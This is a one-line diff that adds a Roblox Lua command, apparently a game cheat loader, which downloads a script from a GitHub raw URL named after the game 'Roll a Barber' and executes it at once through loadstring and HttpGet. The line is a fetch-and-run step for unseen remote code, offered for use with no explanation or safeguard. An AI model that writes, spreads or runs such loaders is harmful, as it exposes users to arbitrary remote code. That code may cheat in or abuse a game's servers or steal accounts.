@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/roll-a-barber-rng-spam7-hzf3m7jtol4yqp.lua"))()
